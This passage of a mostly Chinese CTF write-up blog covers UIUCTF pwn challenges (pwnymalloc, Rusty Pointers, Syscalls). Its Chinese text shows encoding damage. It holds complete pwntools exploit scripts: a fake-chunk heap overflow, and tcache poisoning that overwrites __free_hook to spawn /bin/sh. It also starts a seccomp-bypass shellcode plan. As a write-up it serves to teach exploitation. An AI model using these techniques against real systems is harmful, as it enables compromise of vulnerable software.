class="string">"pwnymalloc.chal.uiuc.tf"</span>, <span class="number">1337</span>, ssl=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">complain</span>(<span class="params">data</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b"&gt; "</span>, <span class="string">b"1"</span>)</span><br><span class="line">    r.sendafter(<span class="string">b":"</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">refund</span>(<span class="params">data</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b"&gt; "</span>, <span class="string">b"3"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b"refunded:\n"</span>, <span class="string">b"0"</span>) <span class="comment"># why would i refund XD</span></span><br><span class="line">    r.sendafter(<span class="string">b"request:\n"</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">win</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b"&gt; "</span>, <span class="string">b"4"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b"ID:\n"</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    conn()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake chunk inside</span></span><br><span class="line">    payload = <span class="string">b'\x00'</span>*<span class="number">0x60</span> + p64(<span class="number">0xb0</span>) +p64(<span class="number">0</span>)+p64(<span class="number">0</span>) + <span class="string">b'\n'</span></span><br><span class="line">    refund(payload)</span><br><span class="line">    <span class="comment"># the target chunk we will overflow</span></span><br><span class="line">    payload = <span class="string">b'\x00'</span>*<span class="number">0x78</span> + p64(<span class="number">0xb0</span>)[:-<span class="number">1</span>]</span><br><span class="line">    refund(payload)</span><br><span class="line">    <span class="comment"># trigger the coalesce</span></span><br><span class="line">    payload = <span class="string">b'BeaCox never complains\n'</span></span><br><span class="line">    complain(payload)</span><br><span class="line">    <span class="comment"># overwrite the target to make it approved</span></span><br><span class="line">    payload = p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p32(<span class="number">1</span>)+p32(<span class="number">0xdeadbeef</span>) + <span class="string">b'\n'</span> <span class="comment"># what about refunding a deadbeef?</span></span><br><span class="line">    refund(payload)</span><br><span class="line">    gdb.attach(r)</span><br><span class="line">    <span class="comment"># win!</span></span><br><span class="line">    win(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></tbody></table></figure><h2 id="Rusty-Pointers"><a href="#Rusty-Pointers" class="headerlink" title="Rusty Pointers"></a>Rusty Pointers</h2><h3 id="æ¦‚å†µ-2"><a href="#æ¦‚å†µ-2" class="headerlink" title="æ¦‚å†µ"></a>æ¦‚å†µ</h3><blockquote><p>The government banned C and C++ in federal software, so we had to rewrite our train schedule management program in Rust. Thanks Joe Biden. Because of government compliance, the program is completely memory safe.</p><p>36 Solves</p></blockquote><p>è¿™é“é¢˜æ˜¯èµ›ä¸­å’Œé˜Ÿå‹å…±åŒè§£å‡ºæ¥çš„ã€‚</p><h3 id="é¢˜ç›®åˆ†æ-2"><a href="#é¢˜ç›®åˆ†æ-2" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>æˆ‘ä»æ¥æ²¡æœ‰å†™è¿‡ä¸€è¡Œ Rust ä»£ç ï¼Œä½†æ˜¯å¯¹å…¶å†…å­˜å®‰å…¨ç‰¹æ€§å´æ˜¯æ—©æœ‰è€³é—»ï¼Œä½†â€¦â€¦çœŸæ˜¯è¿™æ ·å—ï¼Ÿ</p><p>ç¨‹åºä¸»è¦åŠŸèƒ½å¦‚ä¸‹ï¼š</p><ol><li>Create a Rule or Note</li><li>Delete a Rule or Note</li><li>Read a Rule or Note</li><li>Edit a Rule or Note</li><li>Make a Law</li><li>Exit</li></ol><p>è§‚å¯Ÿæºä»£ç å¯ä»¥çœ‹åˆ°ï¼š</p><figure class="highlight rust"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> LEN: <span class="type">usize</span> = <span class="number">64</span>;</span><br><span class="line"><span class="keyword">const</span> LEN2: <span class="type">usize</span> = <span class="number">2000</span>;</span><br><span class="line"><span class="keyword">const</span> LEN3: <span class="type">usize</span> = <span class="number">80</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[inline(never)]</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">get_rule</span>() <span class="punctuation">-&gt;</span> &amp;<span class="symbol">'static</span> <span class="keyword">mut</span> [<span class="type">u8</span>; LEN] {</span><br><span class="line"><span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">buffer</span> = Box::<span class="title function_ invoke__">new</span>([<span class="number">0</span>; LEN]);</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">get_ptr</span>(&amp;<span class="keyword">mut</span> buffer);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="meta">#[inline(never)]</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">get_law</span>() <span class="punctuation">-&gt;</span> &amp;<span class="symbol">'static</span> <span class="keyword">mut</span> [<span class="type">u8</span>; LEN2] {</span><br><span class="line"><span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">buffer</span> = Box::<span class="title function_ invoke__">new</span>([<span class="number">0</span>; LEN2]);</span><br><span class="line"><span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">_buffer2</span> = Box::<span class="title function_ invoke__">new</span>([<span class="number">0</span>; <span class="number">16</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">get_ptr</span>(&amp;<span class="keyword">mut</span> buffer);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="meta">#[inline(never)]</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">get_note</span>() <span class="punctuation">-&gt;</span> <span class="type">Box</span>&lt;[<span class="type">u8</span>; LEN]&gt;{</span><br><span class="line"><span class="keyword">return</span> Box::<span class="title function_ invoke__">new</span>([<span class="number">0</span>; LEN])</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>åªæœ‰<code>get_note()</code>å‡½æ•°æ²¡æœ‰è°ƒç”¨<code>get_ptr</code>ï¼Œé‚£ä¹ˆå¿…æœ‰è¹Šè··ï¼Œè§‚å¯Ÿ<code>get_ptr</code>å‡½æ•°ï¼š</p><figure class="highlight rust"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> S: &amp;&amp;() = &amp;&amp;();</span><br><span class="line"><span class="meta">#[inline(never)]</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">get_ptr</span>&lt;<span class="symbol">'a</span>, <span class="symbol">'b</span>, T: ?<span class="built_in">Sized</span>&gt;(x: &amp;<span class="symbol">'a</span> <span class="keyword">mut</span> T) <span class="punctuation">-&gt;</span> &amp;<span class="symbol">'b</span> <span class="keyword">mut</span> T {</span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">ident</span>&lt;<span class="symbol">'a</span>, <span class="symbol">'b</span>, T: ?<span class="built_in">Sized</span>&gt;(</span><br><span class="line">        _val_a: &amp;<span class="symbol">'a</span> &amp;<span class="symbol">'b</span> (),</span><br><span class="line">        val_b: &amp;<span class="symbol">'b</span> <span class="keyword">mut</span> T,</span><br><span class="line">) <span class="punctuation">-&gt;</span> &amp;<span class="symbol">'a</span> <span class="keyword">mut</span> T {</span><br><span class="line">val_b</span><br><span class="line">}</span><br><span class="line"><span class="keyword">let</span> <span class="variable">f</span>: <span class="title function_ invoke__">fn</span>(_, &amp;<span class="symbol">'a</span> <span class="keyword">mut</span> T) <span class="punctuation">-&gt;</span> &amp;<span class="symbol">'b</span> <span class="keyword">mut</span> T = ident;</span><br><span class="line"><span class="title function_ invoke__">f</span>(S, x)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>çœ‹ä¸Šå»éå¸¸éš¾æ‡‚ï¼Œä½†æ˜¯ chatGPT å‘Šè¯‰æˆ‘è¯¥å‡½æ•°çš„ä½œç”¨æ˜¯å»¶é•¿å˜é‡çš„ç”Ÿå‘½å‘¨æœŸã€‚å¯ä»¥åœ¨ gdb ä¸­è§‚å¯Ÿ<code>get_rule</code>å’Œ<code>get_note</code>çš„åŒºåˆ«ï¼š</p><ol><li><p>Create a Note ç„¶å Edit a Note å†™å…¥<code>aaaa</code></p></li><li><p>Create a Rule ç„¶å Edit a Rule å†™å…¥<code>bbbb</code></p></li><li><p>æŸ¥çœ‹å †</p><p><img src="https://bu.dusays.com/2024/07/06/66894a755d05c.png" class="lazyload" data-srcset="https://bu.dusays.com/2024/07/06/66894a755d05c.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="differnce"></p></li></ol><p>æ˜¾ç„¶ï¼ŒäºŒè€…éƒ½ä¼šç”³è¯·å¤§å°ä¸º0x50çš„å †å—ï¼Œä½†æ˜¯<code>get_ptr()</code>å‡½æ•°ä¼šå°†è¿™ä¸ªå †å—<code>free</code>æ‰ï¼Œå¹¶å…è®¸æˆ‘ä»¬ç»§ç»­ä½¿ç”¨è¿™ä¸ªå †å—ï¼Œä¹Ÿå°±æ˜¯ UAFï¼ˆUse After Freeï¼‰ã€‚</p><p>ä¸Šæ–‡æåˆ°ï¼Œ<code>get_law()</code>ä¹Ÿè°ƒç”¨äº†<code>get_ptr()</code>ï¼Œä¸åŒçš„æ˜¯å®ƒçš„å¤§å°æ¯”è¾ƒå¤§ï¼š</p><figure class="highlight rust"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> LEN2: <span class="type">usize</span> = <span class="number">2000</span>;</span><br><span class="line"><span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">buffer</span> = Box::<span class="title function_ invoke__">new</span>([<span class="number">0</span>; LEN2]);</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">get_ptr</span>(&amp;<span class="keyword">mut</span> buffer);</span><br></pre></td></tr></tbody></table></figure><p>å› æ­¤å°†å…¶<code>free</code>åä¼šè¿›å…¥ unsorted binï¼Œå…¶<code>fd</code>å’Œ<code>bk</code>æŒ‡é’ˆå°†ä¼šæŒ‡å‘<code>libc</code>ä¸­çš„<code>main_arena</code>ï¼Œé€ æˆ<code>libc leak</code>ï¼š</p><p><img src="https://bu.dusays.com/2024/07/06/66894d77b3676.png" class="lazyload" data-srcset="https://bu.dusays.com/2024/07/06/66894d77b3676.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="libc leak"></p><h3 id="æ”»å‡»æ€è·¯-1"><a href="#æ”»å‡»æ€è·¯-1" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h3><p>æ¥ä¸‹æ¥æˆ‘ä»¬å°±éœ€è¦è€ƒè™‘å¦‚ä½•åˆ©ç”¨æ‰‹ä¸Šçš„ UAF äº†ã€‚</p><p><code>libc</code>çš„ç‰ˆæœ¬ä¸º2.31ï¼Œ<code>malloc_hook</code>å’Œ<code>free_hook</code>å¯ä»¥åˆ©ç”¨ï¼Œä¸”<code>tcache</code>æ²¡æœ‰<code>safe link</code>æœºåˆ¶ã€‚</p><p>ç”±äºæ‹¥æœ‰ Write After Free å’Œ Read After Freeï¼Œæˆ‘ä»¬å¯ä»¥ç”¨<a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.31/tcache_poisoning.c">Tcache Poisoning</a>æ–¹æ³•å¾—åˆ° Arbitrary Write å’Œ Arbitrary Readã€‚</p><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ Arbitrary Write å°†<code>free_hook</code>å†™ä¸º<code>system</code>å‡½æ•°åœ°å€ï¼Œç„¶ååœ¨ä¸€ä¸ªå †å—ï¼ˆnoteï¼‰å¼€å¤´å¡«å…¥<code>/bin/sh\x00</code>å¹¶å°†å…¶<code>free</code>ï¼Œè¿™æ ·å°±ä¼šè§¦å‘<code>system('/bin/sh')</code>ã€‚</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">exe = ELF(<span class="string">"./rusty_ptrs"</span>)</span><br><span class="line">libc = ELF(<span class="string">"libc-2.31.so"</span>)</span><br><span class="line">ld = ELF(<span class="string">"ld-2.31.so"</span>)</span><br><span class="line"></span><br><span class="line">context.binary = exe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">conn</span>():</span><br><span class="line">    <span class="keyword">global</span> r</span><br><span class="line">    <span class="keyword">if</span> args.LOCAL:</span><br><span class="line">        r = process([exe.path])</span><br><span class="line">        <span class="keyword">if</span> args.DEBUG:</span><br><span class="line">            gdb.attach(r)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = remote(<span class="string">"rustyptrs.chal.uiuc.tf"</span>, <span class="number">1337</span>, ssl=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_rule</span>():</span><br><span class="line">    r.sendlineafter(<span class="string">b"&gt; "</span>, <span class="string">b"1"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b"&gt; "</span>, <span class="string">b"1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_note</span>():</span><br><span class="line">    r.sendlineafter(<span class="string">b"&gt; "</span>, <span class="string">b"1"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b"&gt; "</span>, <span class="string">b"2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_rule</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b"&gt; "</span>, <span class="string">b"2"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b"&gt; "</span>, <span class="string">b"1"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b"&gt; "</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_note</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b"&gt; "</span>, <span class="string">b"2"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b"&gt; "</span>, <span class="string">b"2"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b"&gt; "</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_rule</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b"&gt; "</span>, <span class="string">b"3"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b"&gt; "</span>, <span class="string">b"1"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b"&gt; "</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_note</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b"&gt; "</span>, <span class="string">b"3"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b"&gt; "</span>, <span class="string">b"2"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b"&gt; "</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_rule</span>(<span class="params">index, content</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b"&gt; "</span>, <span class="string">b"4"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b"&gt; "</span>, <span class="string">b"1"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b"&gt; "</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    r.sendlineafter(<span class="string">b"&gt; "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_note</span>(<span class="params">index, content</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b"&gt; "</span>, <span class="string">b"4"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b"&gt; "</span>, <span class="string">b"2"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b"&gt; "</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    r.sendlineafter(<span class="string">b"&gt; "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_law</span>():</span><br><span class="line">    r.sendlineafter(<span class="string">b"&gt; "</span>, <span class="string">b"5"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    conn()</span><br><span class="line">    <span class="comment"># r.interactive()</span></span><br><span class="line"></span><br><span class="line">    make_law()</span><br><span class="line">    libc_leak = <span class="built_in">int</span>(r.recvuntil(<span class="string">b","</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">    info(<span class="string">f"[L3ak] libc leak: <span class="subst">{<span class="built_in">hex</span>(libc_leak)}</span>"</span>)</span><br><span class="line">    libc.address = libc_leak - <span class="number">0x1ecbe0</span></span><br><span class="line">    info(<span class="string">f"[C4lc] libc base: <span class="subst">{<span class="built_in">hex</span>(libc.address)}</span>"</span>)</span><br><span class="line">    free_hook_addr = libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">    info(<span class="string">f"[C4lc] free hook addr: <span class="subst">{<span class="built_in">hex</span>(free_hook_addr)}</span>"</span>)</span><br><span class="line">    system_addr = libc.sym[<span class="string">'system'</span>]</span><br><span class="line">    info(<span class="string">f"[C4lc] system addr: <span class="subst">{<span class="built_in">hex</span>(system_addr)}</span>"</span>)</span><br><span class="line">    create_note()</span><br><span class="line">    create_note()</span><br><span class="line">    create_note()</span><br><span class="line">    create_note()</span><br><span class="line">    delete_note(<span class="number">3</span>)</span><br><span class="line">    delete_note(<span class="number">2</span>)</span><br><span class="line">    delete_note(<span class="number">1</span>)</span><br><span class="line">    delete_note(<span class="number">0</span>)</span><br><span class="line">    create_rule()</span><br><span class="line">    edit_rule(<span class="number">0</span>, p64(free_hook_addr))</span><br><span class="line">    create_note()</span><br><span class="line">    create_note()</span><br><span class="line">    payload = p64(system_addr)</span><br><span class="line">    <span class="comment"># gdb.attach(r)</span></span><br><span class="line">    edit_note(<span class="number">1</span>, payload)           <span class="comment"># overwrite free_hook with system</span></span><br><span class="line">    edit_note(<span class="number">0</span>, <span class="string">b"/bin/sh\x00"</span>)    <span class="comment"># set /bin/sh as argument</span></span><br><span class="line">    delete_note(<span class="number">0</span>)                  <span class="comment"># delete_note wiil trigger free_hook, which will call system("{what's in note}")</span></span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></tbody></table></figure><h2 id="Syscalls"><a href="#Syscalls" class="headerlink" title="Syscalls"></a>Syscalls</h2><h3 id="æ¦‚å†µ-3"><a href="#æ¦‚å†µ-3" class="headerlink" title="æ¦‚å†µ"></a>æ¦‚å†µ</h3><blockquote><p>You canâ€™t escape this fortress of security.</p><p>143 Solves</p></blockquote><p>è¿™é“é¢˜æ˜¯èµ›ä¸­ç‹¬ç«‹è§£å‡ºæ¥çš„ã€‚</p><h3 id="é¢˜ç›®åˆ†æ-3"><a href="#é¢˜ç›®åˆ†æ-3" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿™é“é¢˜éå¸¸ç®€å•ï¼Œç¨‹åºä¼šå°†æˆ‘ä»¬çš„è¾“å…¥ä½œä¸º shellcode ç›´æ¥æ‰§è¡Œï¼Œä½†æ˜¯é€šè¿‡<code>seccomp</code>å¯¹ç³»ç»Ÿè°ƒç”¨åšäº†é™åˆ¶ã€‚ç”¨<a href="https://github.com/david942j/seccomp-tools">seccomp-tools</a>èƒ½æ¸…æ™°åœ°çœ‹åˆ°<code>seccomp</code>çš„è§„åˆ™ï¼š</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">seccomp-tools dump ./syscalls</span><br><span class="line">The flag is <span class="keyword">in</span> a file named flag.txt located <span class="keyword">in</span> the same directory as this binary. That<span class="string">'s all the information I can give you.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> line  CODE  JT   JF      K</span></span><br><span class="line"><span class="string">=================================</span></span><br><span class="line"><span class="string"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span></span><br><span class="line"><span class="string"> 0001: 0x15 0x00 0x16 0xc000003e  if (A != ARCH_X86_64) goto 0024</span></span><br><span class="line"><span class="string"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span></span><br><span class="line"><span class="string"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span></span><br><span class="line"><span class="string"> 0004: 0x15 0x00 0x13 0xffffffff  if (A != 0xffffffff) goto 0024</span></span><br><span class="line"><span class="string"> 0005: 0x15 0x12 0x00 0x00000000  if (A == read) goto 0024</span></span><br><span class="line"><span class="string"> 0006: 0x15 0x11 0x00 0x00000001  if (A == write) goto 0024</span></span><br><span class="line"><span class="string"> 0007: 0x15 0x10 0x00 0x00000002  if (A == open) goto 0024</span></span><br><span class="line"><span class="string"> 0008: 0x15 0x0f 0x00 0x00000011  if (A == pread64) goto 0024</span></span><br><span class="line"><span class="string"> 0009: 0x15 0x0e 0x00 0x00000013  if (A == readv) goto 0024</span></span><br><span class="line"><span class="string"> 0010: 0x15 0x0d 0x00 0x00000028  if (A == sendfile) goto 0024</span></span><br><span class="line"><span class="string"> 0011: 0x15 0x0c 0x00 0x00000039  if (A == fork) goto 0024</span></span><br><span class="line"><span class="string"> 0012: 0x15 0x0b 0x00 0x0000003b  if (A == execve) goto 0024</span></span><br><span class="line"><span class="string"> 0013: 0x15 0x0a 0x00 0x00000113  if (A == splice) goto 0024</span></span><br><span class="line"><span class="string"> 0014: 0x15 0x09 0x00 0x00000127  if (A == preadv) goto 0024</span></span><br><span class="line"><span class="string"> 0015: 0x15 0x08 0x00 0x00000128  if (A == pwritev) goto 0024</span></span><br><span class="line"><span class="string"> 0016: 0x15 0x07 0x00 0x00000142  if (A == execveat) goto 0024</span></span><br><span class="line"><span class="string"> 0017: 0x15 0x00 0x05 0x00000014  if (A != writev) goto 0023</span></span><br><span class="line"><span class="string"> 0018: 0x20 0x00 0x00 0x00000014  A = fd &gt;&gt; 32 # writev(fd, vec, vlen)</span></span><br><span class="line"><span class="string"> 0019: 0x25 0x03 0x00 0x00000000  if (A &gt; 0x0) goto 0023</span></span><br><span class="line"><span class="string"> 0020: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0024</span></span><br><span class="line"><span class="string"> 0021: 0x20 0x00 0x00 0x00000010  A = fd # writev(fd, vec, vlen)</span></span><br><span class="line"><span class="string"> 0022: 0x25 0x00 0x01 0x000003e8  if (A &lt;= 0x3e8) goto 0024</span></span><br><span class="line"><span class="string"> 0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span></span><br><span class="line"><span class="string"> 0024: 0x06 0x00 0x00 0x00000000  return KILL</span></span><br></pre></td></tr></tbody></table></figure><p>å¯ä»¥çœ‹åˆ°<code>execve</code>å’Œ<code>execveat</code>éƒ½è¢«ç¦ç”¨ï¼Œå› æ­¤ä¸èƒ½ç›´æ¥å¼¹<code>shell</code>ã€‚<code>open</code>, <code>read</code>, <code>write</code>ä¹Ÿè¢«ç¦ç”¨ã€‚</p><h3 id="æ”»å‡»æ€è·¯-2"><a href="#æ”»å‡»æ€è·¯-2" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h3><p>å¯ä»¥åœ¨<a href="https://x64.syscall.sh/">syscall.sh</a>æœç´¢<code>open</code>/<code>read</code>/<code>write</code>æ‰¾åˆ°å¯æ›¿ä»£çš„ç³»ç»Ÿè°ƒç”¨ï¼š<code>open</code>å¯ä»¥ç”¨<code>openat</code>æ›¿ä»£ï¼Œ<code>read</code>å¯ä»¥ç”¨<code>preadv2</code>æ›¿ä»£ï¼Œ<code>write</code>å¯ä»¥ç”¨<code>pwritev2</code>æ›¿ä»£ï¼Œä»ç„¶æ˜¯ç”¨<code>orw</code>ï¼ˆopen, read, writeï¼‰çš„æ–¹å¼è¯»<code>./flag.txt</code>ã€‚ç”¨æ³•å¯ä»¥é€šè¿‡æœç´¢<code>man &lt;syscall name&gt;</code>æ‰¾åˆ°ï¼š</p><ol><li><p><code>openat()</code>ç”¨æ³•</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">openat</span><span class="params">(<span class="type">int</span> dirfd, <span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">int</span> flags)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">openat</span><span class="params">(<span class="type">int</span> dirfd, <span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">int</span> flags, <span class="type">mode_t</span> mode)</span>;</span><br></pre></td></tr></tbody></table></figure><blockquote><p>If <em>pathname</em> is relative and <em>dirfd</em> is the special value <strong>AT_FDCWD</strong>, then <em>pathname</em> is interpreted relative to the current working directory of the calling process </p></blockquote><p><code>openat(AT_FDCWD, './flag.txt', 